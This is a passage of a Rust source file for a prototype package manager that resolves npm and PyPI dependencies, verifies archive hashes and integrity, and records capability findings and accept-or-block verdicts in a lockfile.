use std::collections::{BTreeMap, BTreeSet};
use std::fs;
use std::io::{Cursor, Read};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::str::FromStr;
use std::sync::OnceLock;
use std::{env, fmt};

use base64::{engine::general_purpose::STANDARD, Engine as _};
use flate2::read::GzDecoder;
use omc_cap::{Capability, Policy};
use omc_format::{BehaviorType, CapOp, Function, HttpRequest, Module, Op, Value, VirtualPath};
use omc_verify::{verify_module, VerifyFinding};
use reqwest::blocking::Client;
use semver::Version;
use serde::{Deserialize, Serialize};
use sha1::Sha1;
use sha2::{Digest, Sha256, Sha512};
use tar::Archive;
use thiserror::Error;
use walkdir::{DirEntry, WalkDir};

pub type Result<T> = std::result::Result<T, OmcRegistryError>;

const LOCKFILE: &str = "omc.lock";
const MANIFEST: &str = "omc.toml";
const ARTIFACT_SCHEMA: u32 = 1;
const MAX_FILE_BYTES: u64 = 2 * 1024 * 1024;

#[derive(Debug, Error)]
pub enum OmcRegistryError {
    #[error("unsupported package spec `{0}`")]
    UnsupportedSpec(String),
    #[error("unsupported requirements entry `{0}`")]
    UnsupportedRequirement(String),
    #[error("package version was not found: {0}")]
    PackageNotFound(String),
    #[error("blocked package `{spec}`; use --record-blocked to keep the artifact and lock entry")]
    BlockedPackage { spec: String },
    #[error("registry response did not include a downloadable artifact for {0}")]
    MissingArtifact(String),
    #[error(
        "registry response did not include a compatible PyPI wheel for {0}; source distributions are not built by this prototype"
    )]
    MissingCompatibleWheel(String),
    #[error("could not resolve a version for {name} matching `{requirement}`")]
    UnsatisfiedRequirement { name: String, requirement: String },
    #[error("install requires an accepted lockfile; blocked package remains: {0}")]
    BlockedLockedPackage(String),
    #[error("omc.lock does not satisfy `{0}`; run omc install without --locked to update it")]
    LockfileOutOfDate(String),
    #[error("cannot install unsupported artifact type: {0}")]
    UnsupportedInstallArtifact(String),
    #[error("archive contains an unsafe path: {0}")]
    UnsafeArchivePath(String),
    #[error("downloaded artifact digest mismatch for {name}: expected {expected}, got {actual}")]
    DigestMismatch {
        name: String,
        expected: String,
        actual: String,
    },
    #[error("http error: {0}")]
    Http(#[from] reqwest::Error),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
    #[error("json error: {0}")]
    Json(#[from] serde_json::Error),
    #[error("toml decode error: {0}")]
    TomlDecode(#[from] toml::de::Error),
    #[error("toml encode error: {0}")]
    TomlEncode(#[from] toml::ser::Error),
    #[error("zip error: {0}")]
    Zip(#[from] zip::result::ZipError),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Ecosystem {
    Npm,
    Pypi,
}

impl fmt::Display for Ecosystem {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Npm => f.write_str("npm"),
            Self::Pypi => f.write_str("pypi"),
        }
    }
}

impl FromStr for Ecosystem {
    type Err = OmcRegistryError;

    fn from_str(value: &str) -> Result<Self> {
        match value {
            "npm" => Ok(Self::Npm),
            "pypi" | "py" | "python" => Ok(Self::Pypi),
            _ => Err(OmcRegistryError::UnsupportedSpec(value.to_owned())),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PackageSpec {
    pub ecosystem: Ecosystem,
    pub name: String,
    pub version: Option<String>,
    pub extras: BTreeSet<String>,
    pub direct_url: Option<String>,
}

impl PackageSpec {
    fn new(ecosystem: Ecosystem, name: impl Into<String>, version: Option<String>) -> Self {
        Self {
            ecosystem,
            name: name.into(),
            version,
            extras: BTreeSet::new(),
            direct_url: None,
        }
    }

    fn with_extras(
        ecosystem: Ecosystem,
        name: impl Into<String>,
        version: Option<String>,
        extras: BTreeSet<String>,
    ) -> Self {
        Self {
            ecosystem,
            name: name.into(),
            version,
            extras,
            direct_url: None,
        }
    }

    fn with_direct_url(
        ecosystem: Ecosystem,
        name: impl Into<String>,
        direct_url: impl Into<String>,
        extras: BTreeSet<String>,
    ) -> Self {
        Self {
            ecosystem,
            name: name.into(),
            version: None,
            extras,
            direct_url: Some(direct_url.into()),
        }
    }

    pub fn parse(raw: &str) -> Result<Self> {
        let (ecosystem, rest) = raw
            .split_once(':')
            .ok_or_else(|| OmcRegistryError::UnsupportedSpec(raw.to_owned()))?;
        let ecosystem = Ecosystem::from_str(ecosystem)?;

        match ecosystem {
            Ecosystem::Npm => parse_npm_spec(raw, rest),
            Ecosystem::Pypi => parse_pypi_spec(rest),
        }
    }

    pub fn package_key(&self) -> String {
        format!("{}:{}", self.ecosystem, self.name_with_extras())
    }

    fn constraint_key(&self) -> String {
        format!("{}:{}", self.ecosystem, self.name)
    }

    pub fn requested(&self) -> String {
        if let Some(url) = &self.direct_url {
            return format!("{}:{} @ {}", self.ecosystem, self.name_with_extras(), url);
        }
        match &self.version {
            Some(version) => format!("{}:{}@{}", self.ecosystem, self.name_with_extras(), version),
            None => self.package_key(),
        }
    }

    fn name_with_extras(&self) -> String {
        if self.ecosystem == Ecosystem::Pypi && !self.extras.is_empty() {
            format!(
                "{}[{}]",
                self.name,
                self.extras.iter().cloned().collect::<Vec<_>>().join(",")
            )
        } else {
            self.name.clone()
        }
    }
}

fn parse_npm_spec(raw: &str, rest: &str) -> Result<PackageSpec> {
    if rest.is_empty() {
        return Err(OmcRegistryError::UnsupportedSpec(raw.to_owned()));
    }

    let version_at = if let Some(stripped) = rest.strip_prefix('@') {
        stripped.rfind('@').map(|index| index + 1)
    } else {
        rest.rfind('@')
    };

    let (name, version) = match version_at {
        Some(index) => (&rest[..index], Some(rest[index + 1..].to_owned())),
        None => (rest, None),
    };

    if name.is_empty() || version.as_deref() == Some("") {
        return Err(OmcRegistryError::UnsupportedSpec(raw.to_owned()));
    }

    Ok(PackageSpec::new(Ecosystem::Npm, name, version))
}

fn parse_pypi_spec(rest: &str) -> Result<PackageSpec> {
    if let Some((spec, _)) = parse_pypi_direct_requirement(rest, &BTreeSet::new()) {
        return Ok(spec);
    }

    let (name, version) = if let Some((name, version)) = rest.split_once("==") {
        (name, Some(version.to_owned()))
    } else if let Some((name, version)) = rest.rsplit_once('@') {
        (name, Some(version.to_owned()))
    } else {
        return parse_pypi_requirement(rest)
            .ok_or_else(|| OmcRegistryError::UnsupportedSpec(rest.to_owned()));
    };

    let (name, extras) = parse_pypi_name_and_extras(name);

    if name.is_empty() || version.as_deref() == Some("") {
        return Err(OmcRegistryError::UnsupportedSpec(rest.to_owned()));
    }

    Ok(PackageSpec::with_extras(
        Ecosystem::Pypi,
        name,
        version,
        extras,
    ))
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OmcManifest {
    pub project: ProjectInfo,
    #[serde(default)]
    pub dependencies: BTreeMap<String, String>,
    #[serde(default, rename = "dev-dependencies")]
    pub dev_dependencies: BTreeMap<String, String>,
    #[serde(default, skip_serializing_if = "ManifestPolicy::is_empty")]
    pub policy: ManifestPolicy,
    #[serde(default, skip_serializing_if = "ManifestRegistries::is_empty")]
    pub registries: ManifestRegistries,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectInfo {
    pub name: String,
    pub version: String,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ManifestPolicy {
    #[serde(default)]
    pub allow: Vec<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ManifestRegistries {
    #[serde(default, rename = "pypi-index-url")]
    pub pypi_index_url: Option<String>,
    #[serde(default, rename = "pypi-extra-index-urls")]
    pub pypi_extra_index_urls: Vec<String>,
}

impl ManifestPolicy {
    fn is_empty(&self) -> bool {
        self.allow.is_empty()
    }
}

impl ManifestRegistries {
    fn is_empty(&self) -> bool {
        self.pypi_index_url.is_none() && self.pypi_extra_index_urls.is_empty()
    }
}

impl OmcManifest {
    pub fn new(name: impl Into<String>) -> Self {
        Self {
            project: ProjectInfo {
                name: name.into(),
                version: "0.1.0".to_owned(),
            },
            dependencies: BTreeMap::new(),
            dev_dependencies: BTreeMap::new(),
            policy: ManifestPolicy::default(),
            registries: ManifestRegistries::default(),
        }
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct OmcLock {
    pub version: u32,
    #[serde(default)]
    pub packages: Vec<LockedPackage>,
}

impl OmcLock {
    pub fn new() -> Self {
        Self {
            version: 1,
            packages: Vec::new(),
        }
    }

    fn upsert(&mut self, package: LockedPackage) {
        if let Some(existing) = self.packages.iter_mut().find(|entry| {
            entry.ecosystem == package.ecosystem
                && entry.name == package.name
                && entry.version == package.version
        }) {
            *existing = package;
        } else {
            self.packages.push(package);
            self.packages.sort_by(|left, right| {
                (
                    left.ecosystem,
                    left.name.as_str(),
                    left.version.as_str(),
                    left.sha256.as_str(),
                )
                    .cmp(&(
                        right.ecosystem,
                        right.name.as_str(),
                        right.version.as_str(),
                        right.sha256.as_str(),
                    ))
            });
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LockedPackage {
    pub ecosystem: Ecosystem,
    pub name: String,
    pub version: String,
    pub source_url: String,
    pub archive: String,
    pub artifact: String,
    pub sha256: String,
    pub behavior: Behavior,
    pub verdict: Verdict,
    #[serde(default)]
    pub dependencies: Vec<String>,
    #[serde(default)]
    pub optional_dependencies: Vec<String>,
    #[serde(default)]
    pub grants: Vec<String>,
    #[serde(default)]
    pub capabilities: Vec<CapabilityFinding>,
    #[serde(default)]
    pub verifier_findings: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Behavior {
    Pure,
    HostCapability,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Verdict {
    Accepted,
    Blocked,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub struct CapabilityFinding {
    pub kind: CapabilityKind,
    pub target: String,
    pub source: String,
    pub evidence: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CapabilityKind {
    EnvRead,
    FsRead,
    FsWrite,
    HttpRequest,
    ProcSpawn,
    DynamicEval,
}

impl fmt::Display for CapabilityKind {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::EnvRead => f.write_str("env_read"),
            Self::FsRead => f.write_str("fs_read"),
            Self::FsWrite => f.write_str("fs_write"),
            Self::HttpRequest => f.write_str("http_request"),
            Self::ProcSpawn => f.write_str("proc_spawn"),
            Self::DynamicEval => f.write_str("dynamic_eval"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OmcArtifact {
    pub schema: u32,
    pub package: ArtifactPackage,
    pub source_url: String,
    pub source_sha256: String,
    pub compiler: String,
    pub behavior: Behavior,
    pub verdict: Verdict,
    pub grants: Vec<String>,
    pub dependencies: Vec<String>,
    #[serde(default)]
    pub optional_dependencies: Vec<String>,
    pub files_scanned: usize,
    pub capabilities: Vec<CapabilityFinding>,
    pub verifier_findings: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ArtifactPackage {
    pub ecosystem: Ecosystem,
    pub name: String,
    pub version: String,
}

#[derive(Debug, Clone)]
pub struct LinkOptions {
    pub project_dir: PathBuf,
    pub record_blocked: bool,
    pub allowed_capabilities: Vec<Capability>,
    pub constraints: BTreeMap<String, String>,
    pub hashes: BTreeMap<String, BTreeSet<String>>,
    pub npm_integrities: BTreeMap<String, BTreeSet<String>>,
    pub npm_resolved: BTreeMap<String, String>,
    pub pypi_index_url: Option<String>,
    pub pypi_extra_index_urls: Vec<String>,
    pub pypi_find_links: Vec<String>,
    pub pypi_no_index: bool,
    pub project_extras: BTreeSet<String>,
    pub include_dev_dependencies: bool,
    pub save_dev_dependency: bool,
}

impl LinkOptions {
    pub fn new(project_dir: impl Into<PathBuf>) -> Self {
        Self {
            project_dir: project_dir.into(),
            record_blocked: false,
            allowed_capabilities: Vec::new(),
            constraints: BTreeMap::new(),
            hashes: BTreeMap::new(),
            npm_integrities: BTreeMap::new(),
            npm_resolved: BTreeMap::new(),
            pypi_index_url: None,
            pypi_extra_index_urls: Vec::new(),
            pypi_find_links: Vec::new(),
            pypi_no_index: false,
            project_extras: BTreeSet::new(),
            include_dev_dependencies: true,
            save_dev_dependency: false,
        }
    }
}

#[derive(Debug, Clone)]
pub struct LinkReport {
    pub locked: LockedPackage,
    pub artifact: OmcArtifact,
    pub lockfile: PathBuf,
    pub manifest: PathBuf,
}

#[derive(Debug, Clone, Default)]
pub struct InstallReport {
    pub npm_packages: usize,
    pub pypi_packages: usize,
    pub npm_bins: usize,
    pub python_scripts: usize,
    pub node_modules: PathBuf,
    pub npm_bin_dir: PathBuf,
    pub python_site_packages: PathBuf,
    pub python_bin_dir: PathBuf,
}

#[derive(Debug, Clone, Default)]
pub struct ProjectRequirements {
    pub specs: Vec<PackageSpec>,
    pub constraints: BTreeMap<String, String>,
    pub hashes: BTreeMap<String, BTreeSet<String>>,
    pub npm_integrities: BTreeMap<String, BTreeSet<String>>,
    pub npm_resolved: BTreeMap<String, String>,
    pub pypi_index_url: Option<String>,
    pub pypi_extra_index_urls: Vec<String>,
    pub pypi_find_links: Vec<String>,
    pub pypi_no_index: bool,
}

#[derive(Debug, Clone)]
struct ResolvedPackage {
    ecosystem: Ecosystem,
    name: String,
    version: String,
    source_url: String,
    download_url: Option<String>,
    local_path: Option<PathBuf>,
    filename: String,
    expected_sha256: Option<String>,
    expected_sha1: Option<String>,
    expected_integrity: Option<String>,
    npm_direct_tarball: bool,
    pypi_direct_wheel: bool,
    npm_scripts: BTreeMap<String, String>,
    platform_compatible: bool,
    dependencies: Vec<PackageDependency>,
}

#[derive(Debug, Clone)]
struct PackageDependency {
    spec: PackageSpec,
    optional: bool,
}

pub fn init_project(project_dir: impl AsRef<Path>, name: Option<&str>) -> Result<PathBuf> {
    let project_dir = project_dir.as_ref();
    fs::create_dir_all(project_dir.join(".omc"))?;

    let manifest_path = project_dir.join(MANIFEST);
    if !manifest_path.exists() {
        let project_name = name.map(str::to_owned).unwrap_or_else(|| {
            project_dir
                .file_name()
                .and_then(|name| name.to_str())
                .unwrap_or("omc-project")
                .to_owned()
        });
        let manifest = OmcManifest::new(project_name);
        fs::write(&manifest_path, toml::to_string_pretty(&manifest)?)?;
    }

    let lockfile_path = project_dir.join(LOCKFILE);
    if !lockfile_path.exists() {
        fs::write(&lockfile_path, toml::to_string_pretty(&OmcLock::new())?)?;
    }

    Ok(manifest_path)
}

pub fn link_package(spec: &PackageSpec, options: &LinkOptions) -> Result<LinkReport> {
    init_project(&options.project_dir, None)?;
    let options = options_with_manifest_policy(options)?;

    let client = Client::builder().user_agent("omc-prototype/0.1").build()?;
    let (report, _) = link_package_inner(&client, spec, false, &options, true)?
        .ok_or_else(|| OmcRegistryError::UnsupportedSpec(spec.requested()))?;
    Ok(report)
}

pub fn add_package_graph(spec: &PackageSpec, options: &LinkOptions) -> Result<Vec<LinkReport>> {
    init_project(&options.project_dir, None)?;
    let options = options_with_manifest_policy(options)?;

    let client = Client::builder().user_agent("omc-prototype/0.1").build()?;
    let reports = resolve_package_graph(&client, spec, &options)?;

    if let Some(root) = reports.first() {
        write_manifest_dependency(
            &options.project_dir,
            spec,
            &root.locked.version,
            options.save_dev_dependency,
        )?;
    }

    Ok(reports)
}

pub fn remove_manifest_dependency(
    project_dir: impl AsRef<Path>,
    spec: &PackageSpec,
) -> Result<bool> {
    let project_dir = project_dir.as_ref();
    init_project(project_dir, None)?;

    let manifest_path = project_dir.join(MANIFEST);
    let mut manifest = read_manifest(&manifest_path)?;
    let removed = manifest.dependencies.remove(&spec.package_key()).is_some()
        || manifest
            .dev_dependencies
            .remove(&spec.package_key())
            .is_some();
    fs::write(&manifest_path, toml::to_string_pretty(&manifest)?)?;
    Ok(removed)
}

pub fn add_manifest_policy_grants(
    project_dir: impl AsRef<Path>,
    grants: &[String],
) -> Result<Vec<String>> {
    let project_dir = project_dir.as_ref();
    init_project(project_dir, None)?;

    let manifest_path = project_dir.join(MANIFEST);
    let mut manifest = read_manifest(&manifest_path)?;
    let mut existing = manifest
        .policy
        .allow
        .iter()
        .cloned()
        .collect::<BTreeSet<_>>();
    let mut added = Vec::new();
    for grant in grants {
        let normalized = parse_capability_grant(grant)?.to_string();
        if existing.insert(normalized.clone()) {
            added.push(normalized);
        }
    }
    manifest.policy.allow = existing.into_iter().collect();
    fs::write(&manifest_path, toml::to_string_pretty(&manifest)?)?;
    Ok(added)
}

pub fn install_project(options: &LinkOptions) -> Result<InstallReport> {
    init_project(&options.project_dir, None)?;

    let mut options = options.clone();
    let specs = project_requested_specs(&mut options)?;

    let client = Client::builder().user_agent("omc-prototype/0.1").build()?;
    let mut seen_roots = BTreeSet::new();
    let mut retained = BTreeSet::new();
    for spec in specs {
        if !seen_roots.insert(spec.requested()) {
            continue;
        }
        for report in resolve_package_graph(&client, &spec, &options)? {
            retained.insert(locked_package_key(&report.locked));
        }
    }

    prune_lockfile(&options.project_dir, &retained)?;
    install_locked_packages(&options.project_dir)
}

pub fn install_locked_project(options: &LinkOptions) -> Result<InstallReport> {
    init_project(&options.project_dir, None)?;

    let mut options = options.clone();
    let specs = project_requested_specs(&mut options)?;
    let lock = read_lockfile(options.project_dir.join(LOCKFILE))?;
    let retained = locked_reachable_package_keys(&lock, &specs, &options)?;
    let mut selected = lock;
    selected
        .packages
        .retain(|package| retained.contains(&locked_package_key(package)));

    install_lock(&options.project_dir, &selected)
}

fn project_requested_specs(options: &mut LinkOptions) -> Result<Vec<PackageSpec>> {
    let manifest = read_manifest(options.project_dir.join(MANIFEST))?;
    apply_manifest_config(&manifest, options)?;
    let mut specs = Vec::new();
    for (key, version) in manifest.dependencies {
        specs.push(PackageSpec::parse(&format!("{key}@{version}"))?);
    }
    if options.include_dev_dependencies {
        for (key, version) in manifest.dev_dependencies {
            specs.push(PackageSpec::parse(&format!("{key}@{version}"))?);
        }
    }
    let discovered = discover_project_requirements_with_options(
        &options.project_dir,
        &options.project_extras,
        options.include_dev_dependencies,
    )?;
    specs.extend(discovered.specs);
    options.constraints.extend(discovered.constraints);
    options.hashes.extend(discovered.hashes);
    options.npm_integrities.extend(discovered.npm_integrities);
    options.npm_resolved.extend(discovered.npm_resolved);
    if discovered.pypi_index_url.is_some() {
        options.pypi_index_url = discovered.pypi_index_url;
    }
    options
        .pypi_extra_index_urls
        .extend(discovered.pypi_extra_index_urls);
    options.pypi_find_links.extend(discovered.pypi_find_links);
    options.pypi_no_index |= discovered.pypi_no_index;

    let mut seen = BTreeSet::new();
    specs.retain(|spec| seen.insert(spec.requested()));
    Ok(specs)
}

fn locked_reachable_package_keys(
    lock: &OmcLock,
    specs: &[PackageSpec],
    options: &LinkOptions,
) -> Result<BTreeSet<String>> {
    let mut retained = BTreeSet::new();
    for spec in specs {
        let package =
            find_locked_package_for_spec(lock, spec, &options.constraints, &options.hashes)
                .ok_or_else(|| OmcRegistryError::LockfileOutOfDate(spec.requested()))?;
        collect_locked_dependencies(lock, package, &mut retained)?;
    }
    Ok(retained)
}

fn collect_locked_dependencies(
    lock: &OmcLock,
    package: &LockedPackage,
    retained: &mut BTreeSet<String>,
) -> Result<()> {
    if !retained.insert(locked_package_key(package)) {
        return Ok(());
    }

    for dependency in &package.dependencies {
        let spec = PackageSpec::parse(dependency)?;
        let dependency =
            find_locked_package_for_spec(lock, &spec, &BTreeMap::new(), &BTreeMap::new())
                .ok_or_else(|| OmcRegistryError::LockfileOutOfDate(spec.requested()))?;
        collect_locked_dependencies(lock, dependency, retained)?;
    }
    for dependency in &package.optional_dependencies {
        let spec = PackageSpec::parse(dependency)?;
        if let Some(dependency) =
            find_locked_package_for_spec(lock, &spec, &BTreeMap::new(), &BTreeMap::new())
        {
            collect_locked_dependencies(lock, dependency, retained)?;
        }
    }

    Ok(())
}

fn find_locked_package_for_spec<'a>(
    lock: &'a OmcLock,
    spec: &PackageSpec,
    constraints: &BTreeMap<String, String>,
    hashes: &BTreeMap<String, BTreeSet<String>>,
) -> Option<&'a LockedPackage> {
    lock.packages
        .iter()
        .filter(|package| package.ecosystem == spec.ecosystem)
        .filter(|package| locked_package_name_matches(package, spec))
        .filter(|package| {
            spec.direct_url
                .as_deref()
                .map(|url| package.source_url == url)
                .unwrap_or(true)
        })
        .filter(|package| locked_package_version_matches(package, spec, constraints))
        .filter(|package| {
            hashes
                .get(&spec.constraint_key())
                .map(|allowed| allowed.contains(&package.sha256))
                .unwrap_or(true)
        })
        .max_by(|left, right| match spec.ecosystem {
            Ecosystem::Npm => compare_npm_versions(&left.version, &right.version),
            Ecosystem::Pypi => compare_pypi_versions(&left.version, &right.version),
        })
}

fn locked_package_name_matches(package: &LockedPackage, spec: &PackageSpec) -> bool {
    match spec.ecosystem {
        Ecosystem::Npm => package.name == spec.name,
        Ecosystem::Pypi => normalize_pypi_name(&package.name) == spec.name,
    }
}

fn locked_package_version_matches(
    package: &LockedPackage,
    spec: &PackageSpec,
    constraints: &BTreeMap<String, String>,
) -> bool {
    match spec.ecosystem {
        Ecosystem::Npm => {
            let Ok((_, requirement)) = npm_registry_name_and_requirement(spec) else {
                return false;
            };
            constrained_npm_requirement(spec, requirement.as_deref(), constraints)
                .as_deref()
                .map(|requirement| npm_version_satisfies(&package.version, requirement))
                .unwrap_or(true)
        }
        Ecosystem::Pypi => constrained_pypi_requirement(spec, constraints)
            .as_deref()
            .map(|requirement| pypi_version_satisfies(&package.version, requirement))
            .unwrap_or(true),
    }
}

pub fn discover_project_specs(project_dir: impl AsRef<Path>) -> Result<Vec<PackageSpec>> {
    Ok(discover_project_requirements(project_dir)?.specs)
}

pub fn read_package_scripts(project_dir: impl AsRef<Path>) -> Result<BTreeMap<String, String>> {
    let package_json = project_dir.as_ref().join("package.json");
    if !package_json.exists() {
        return Ok(BTreeMap::new());
    }

    let package = serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(package_json)?)?;
    Ok(package.scripts)
}

pub fn discover_project_requirements(project_dir: impl AsRef<Path>) -> Result<ProjectRequirements> {
    discover_project_requirements_with_extras(project_dir, &BTreeSet::new())
}

pub fn discover_project_requirements_with_extras(
    project_dir: impl AsRef<Path>,
    project_extras: &BTreeSet<String>,
) -> Result<ProjectRequirements> {
    discover_project_requirements_with_options(project_dir, project_extras, true)
}

fn resolve_package_graph(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
) -> Result<Vec<LinkReport>> {
    let mut reports = Vec::new();
    let mut seen = BTreeSet::new();
    add_package_graph_inner(client, spec, false, options, &mut seen, &mut reports)?;
    Ok(reports)
}

fn discover_project_requirements_with_options(
    project_dir: impl AsRef<Path>,
    project_extras: &BTreeSet<String>,
    include_dev_dependencies: bool,
) -> Result<ProjectRequirements> {
    let project_dir = project_dir.as_ref();
    let mut project = ProjectRequirements::default();

    let package_json = project_dir.join("package.json");
    if package_json.exists() {
        project.specs.extend(read_package_json_specs(
            &package_json,
            include_dev_dependencies,
        )?);
    }

    for lockfile_name in ["package-lock.json", "npm-shrinkwrap.json"] {
        let lockfile = project_dir.join(lockfile_name);
        if lockfile.exists() {
            let lock_requirements = read_package_lock_requirements(&lockfile)?;
            project.constraints.extend(lock_requirements.constraints);
            project
                .npm_integrities
                .extend(lock_requirements.npm_integrities);
            project.npm_resolved.extend(lock_requirements.npm_resolved);
        }
    }

    let yarn_lock = project_dir.join("yarn.lock");
    if yarn_lock.exists() {
        let lock_requirements = read_yarn_lock_requirements(&yarn_lock)?;
        project.constraints.extend(lock_requirements.constraints);
        project
            .npm_integrities
            .extend(lock_requirements.npm_integrities);
        project.npm_resolved.extend(lock_requirements.npm_resolved);
    }

    let requirements_txt = project_dir.join("requirements.txt");
    if requirements_txt.exists() {
        let requirements = read_requirements_file(&requirements_txt)?;
        project.specs.extend(requirements.specs);
        project.constraints.extend(requirements.constraints);
        project.hashes.extend(requirements.hashes);
        if requirements.pypi_index_url.is_some() {
            project.pypi_index_url = requirements.pypi_index_url;
        }
        project
            .pypi_extra_index_urls
            .extend(requirements.pypi_extra_index_urls);
        project.pypi_find_links.extend(requirements.pypi_find_links);
        project.pypi_no_index |= requirements.pypi_no_index;
    }

    let pyproject_toml = project_dir.join("pyproject.toml");
    if pyproject_toml.exists() {
        let requirements =
            read_pyproject_requirements(&pyproject_toml, project_extras, include_dev_dependencies)?;
        project.specs.extend(requirements.specs);
    }

    let poetry_lock = project_dir.join("poetry.lock");
    if poetry_lock.exists() {
        let requirements = read_poetry_lock_requirements(&poetry_lock)?;
        project.constraints.extend(requirements.constraints);
        project.hashes.extend(requirements.hashes);
    }

    Ok(project)
}

fn add_package_graph_inner(
    client: &Client,
    spec: &PackageSpec,
    optional_dependency: bool,
    options: &LinkOptions,
    seen: &mut BTreeSet<String>,
    reports: &mut Vec<LinkReport>,
) -> Result<()> {
    let Some((report, dependencies)) =
        link_package_inner(client, spec, optional_dependency, options, false)?
    else {
        return Ok(());
    };
    let resolved_key = format!(
        "{}:{}@{}",
        report.locked.ecosystem,
        spec.name_with_extras(),
        report.locked.version
    );

    if !seen.insert(resolved_key) {
        return Ok(());
    }

    reports.push(report);

    for dependency in dependencies {
        add_package_graph_inner(
            client,
            &dependency.spec,
            dependency.optional,
            options,
            seen,
            reports,
        )?;
    }

    Ok(())
}

fn link_package_inner(
    client: &Client,
    spec: &PackageSpec,
    optional_dependency: bool,
    options: &LinkOptions,
    update_manifest: bool,
) -> Result<Option<(LinkReport, Vec<PackageDependency>)>> {
    let mut resolved = resolve_package(client, spec, options)?;
    if !resolved.platform_compatible {
        if optional_dependency {
            return Ok(None);
        }

        return Err(OmcRegistryError::UnsupportedSpec(format!(
            "{} is not compatible with this platform",
            spec.requested()
        )));
    }

    let archive_bytes = download_artifact(client, &resolved, &options.project_dir)?;
    let sha256 = sha256_hex(&archive_bytes);

    if let Some(expected) = &resolved.expected_sha256 {
        if !expected.eq_ignore_ascii_case(&sha256) {
            return Err(OmcRegistryError::DigestMismatch {
                name: resolved.name.clone(),
                expected: expected.clone(),
                actual: sha256,
            });
        }
    }
    if let Some(expected) = &resolved.expected_sha1 {
        let actual = sha1_hex(&archive_bytes);
        if !expected.eq_ignore_ascii_case(&actual) {
            return Err(OmcRegistryError::DigestMismatch {
                name: resolved.name.clone(),
                expected: format!("sha1:{expected}"),
                actual: format!("sha1:{actual}"),
            });
        }
    }
    if let Some(expected) = &resolved.expected_integrity {
        verify_npm_integrity(&resolved.name, expected, &archive_bytes)?;
    }
    if resolved.ecosystem == Ecosystem::Npm {
        if let Some(integrities) = options.npm_integrities.get(&spec.constraint_key()) {
            for integrity in integrities {
                verify_npm_integrity(&resolved.name, integrity, &archive_bytes)?;
            }
        }
    }
    if let Some(hashes) = options.hashes.get(&spec.constraint_key()) {
        if !hashes.contains(&sha256) {
            return Err(OmcRegistryError::DigestMismatch {
                name: resolved.name.clone(),
                expected: hashes.iter().cloned().collect::<Vec<_>>().join(","),
                actual: sha256,
            });
        }
    }

    let dependencies = if resolved.npm_direct_tarball {
        let manifest = npm_manifest_from_tgz(&archive_bytes)?;
        if manifest.version != resolved.version {
            return Err(OmcRegistryError::UnsupportedSpec(format!(
                "locked npm tarball version mismatch for `{}`: expected {}, got {}",
                resolved.name, resolved.version, manifest.version
            )));
        }
        resolved.platform_compatible = npm_manifest_platform_compatible(&manifest);
        resolved.npm_scripts = manifest.scripts.clone().unwrap_or_default();
        npm_manifest_runtime_dependencies(&manifest)
    } else if resolved.pypi_direct_wheel {
        pypi_wheel_dependencies(&archive_bytes, &spec.extras)?
    } else {
        resolved.dependencies.clone()
    };
    if !resolved.platform_compatible {
        if optional_dependency {
            return Ok(None);
        }

        return Err(OmcRegistryError::UnsupportedSpec(format!(
            "{} is not compatible with this platform",
            spec.requested()
        )));
    }
    let archive_path = cache_archive(&options.project_dir, &resolved, &sha256, &archive_bytes)?;
    let profile = profile_archive(&resolved, &archive_bytes)?;
    let module = module_from_profile(&resolved, &profile.capabilities);
    let policy = options
        .allowed_capabilities
        .iter()
        .cloned()
        .fold(Policy::pure(), Policy::allow_capability);
    let verification = verify_module(&module, &policy);
    let verifier_findings = verification
        .err()
        .map(|error| {
            error
                .findings
                .into_iter()
                .map(render_verify_finding)
                .collect::<Vec<_>>()
        })
        .unwrap_or_default();
    let verdict = if verifier_findings.is_empty() {
        Verdict::Accepted
    } else {
        Verdict::Blocked
    };
    let behavior = if profile.capabilities.is_empty() {
        Behavior::Pure
    } else {
        Behavior::HostCapability
    };

    let artifact = OmcArtifact {
        schema: ARTIFACT_SCHEMA,
        package: ArtifactPackage {
            ecosystem: resolved.ecosystem,
            name: resolved.name.clone(),
            version: resolved.version.clone(),
        },
        source_url: resolved.source_url.clone(),
        source_sha256: sha256.clone(),
        compiler: "omc-prototype-source-profiler".to_owned(),
        behavior,
        verdict,
        grants: options
            .allowed_capabilities
            .iter()
            .map(ToString::to_string)
            .collect(),
        dependencies: dependencies
            .iter()
            .filter(|dependency| !dependency.optional)
            .map(|dependency| dependency.spec.requested())
            .collect(),
        optional_dependencies: dependencies
            .iter()
            .filter(|dependency| dependency.optional)
            .map(|dependency| dependency.spec.requested())
            .collect(),
        files_scanned: profile.files_scanned,
        capabilities: profile.capabilities,
        verifier_findings: verifier_findings.clone(),
    };
    let artifact_path = write_artifact(&options.project_dir, &resolved, &artifact)?;

    let locked = LockedPackage {
        ecosystem: resolved.ecosystem,
        name: resolved.name.clone(),
        version: resolved.version.clone(),
        source_url: resolved.source_url.clone(),
        archive: relative_path(&options.project_dir, &archive_path),
        artifact: relative_path(&options.project_dir, &artifact_path),
        sha256,
